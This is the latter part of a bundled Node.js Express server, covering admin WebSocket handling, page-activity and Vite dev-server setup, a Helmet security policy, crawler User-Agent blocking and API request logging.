      console.log("[WebSocket] Admin client disconnected");
      adminClients.delete(ws);
    });
    ws.on("error", (error) => {
      console.error("[WebSocket] Client error:", error);
      adminClients.delete(ws);
    });
  });
  app2.get("/api/admin/pages", async (req, res) => {
    try {
      const pages = Array.from(pageActivity.values());
      res.json(pages);
    } catch (error) {
      console.error("Error getting page activity:", error);
      res.status(500).json({
        success: false,
        message: "Internal server error"
      });
    }
  });
  return httpServer;
}

// server/vite.ts
var import_express = __toESM(require("express"), 1);
var import_fs2 = __toESM(require("fs"), 1);
var import_path3 = __toESM(require("path"), 1);
var import_vite2 = require("vite");

// vite.config.ts
var import_vite = require("vite");
var import_plugin_react = __toESM(require("@vitejs/plugin-react"), 1);
var import_path2 = __toESM(require("path"), 1);
var vite_config_default = (0, import_vite.defineConfig)({
  plugins: [
    (0, import_plugin_react.default)()
  ],
  resolve: {
    alias: {
      "@": import_path2.default.resolve(process.cwd(), "client", "src"),
      "@shared": import_path2.default.resolve(process.cwd(), "shared"),
      "@assets": import_path2.default.resolve(process.cwd(), "attached_assets")
    }
  },
  root: import_path2.default.resolve(process.cwd(), "client"),
  build: {
    outDir: import_path2.default.resolve(process.cwd(), "dist/public"),
    emptyOutDir: true
  },
  server: {
    port: 5e3,
    proxy: {
      "/api": {
        target: "http://localhost:5000",
        changeOrigin: true
      },
      "/ws": {
        target: "ws://localhost:5000",
        ws: true
      }
    },
    fs: {
      strict: true,
      deny: ["**/.*"]
    },
    allowedHosts: true
  }
});

// server/vite.ts
var import_nanoid = require("nanoid");
var viteLogger = (0, import_vite2.createLogger)();
function log(message, source = "express") {
  const formattedTime = (/* @__PURE__ */ new Date()).toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "2-digit",
    second: "2-digit",
    hour12: true
  });
  console.log(`${formattedTime} [${source}] ${message}`);
}
async function setupVite(app2, server) {
  const serverOptions = {
    middlewareMode: true,
    hmr: { server },
    allowedHosts: true
  };
  const vite = await (0, import_vite2.createServer)({
    ...vite_config_default,
    configFile: false,
    customLogger: {
      ...viteLogger,
      error: (msg, options) => {
        viteLogger.error(msg, options);
        process.exit(1);
      }
    },
    server: serverOptions,
    appType: "custom"
  });
  app2.use(vite.middlewares);
  app2.use("*", async (req, res, next) => {
    const url = req.originalUrl;
    try {
      const clientTemplate = import_path3.default.resolve(
        process.cwd(),
        "client",
        "index.html"
      );
      let template = await import_fs2.default.promises.readFile(clientTemplate, "utf-8");
      template = template.replace(
        `src="/src/main.tsx"`,
        `src="/src/main.tsx?v=${(0, import_nanoid.nanoid)()}"`
      );
      const page = await vite.transformIndexHtml(url, template);
      res.status(200).set({ "Content-Type": "text/html" }).end(page);
    } catch (e) {
      vite.ssrFixStacktrace(e);
      next(e);
    }
  });
}
function serveStatic(app2) {
  const distPath = import_path3.default.resolve(process.cwd(), "dist/public");
  if (!import_fs2.default.existsSync(distPath)) {
    throw new Error(
      `Could not find the build directory: ${distPath}, make sure to build the client first`
    );
  }
  app2.use(import_express.default.static(distPath));
  app2.use("*", (_req, res) => {
    res.sendFile(import_path3.default.resolve(distPath, "index.html"));
  });
}

// server/index.ts
var import_helmet = __toESM(require("helmet"), 1);
var app = (0, import_express2.default)();
app.set("trust proxy", true);
app.use(import_express2.default.json());
app.use(import_express2.default.urlencoded({ extended: false }));
app.use(
  (0, import_helmet.default)({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
        // unsafe-eval needed for some dev tools
        styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
        fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
        imgSrc: ["'self'", "data:", "blob:"],
        connectSrc: ["'self'", "ws:", "wss:"]
        // Allow WebSocket connections
      }
    }
  })
);
app.use((req, res, next) => {
  const userAgent = req.get("User-Agent") || "";
  const blockedAgents = [
    "MJ12bot",
    "AhrefsBot",
    "SemrushBot",
    "DotBot",
    "Baiduspider",
    "YandexBot",
    "Sogou",
    "Exabot",
    "facebot",
    "ia_archiver"
  ];
  if (blockedAgents.some((agent) => userAgent.includes(agent))) {
    console.log(`[Security] Blocked User-Agent: ${userAgent} | IP: ${req.ip}`);
    return res.status(403).send("Forbidden");
  }
  next();
});
app.use((req, res, next) => {
  const start = Date.now();
  const path4 = req.path;
  let capturedJsonResponse = void 0;
  const originalResJson = res.json;
  res.json = function(bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };
  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path4.startsWith("/api")) {
      let logLine = `${req.method} ${path4} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      }
      if (logLine.length > 80) {
        logLine = logLine.slice(0, 79) + "\u2026";
      }
      log(logLine);
    }
  });
  next();
});
(async () => {
  const server = await registerRoutes(app);
  app.use((err, _req, res, _next) => {
    const status = err.status || err.statusCode || 500;
    const message = err.message || "Internal Server Error";
    res.status(status).json({ message });
    throw err;
  });
  if (app.get("env") === "development") {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }
  const port = parseInt(process.env.PORT || "5000", 10);
  server.listen({
    port,
    host: "0.0.0.0"
  }, () => {
    log(`serving on port ${port}`);
  });
})();
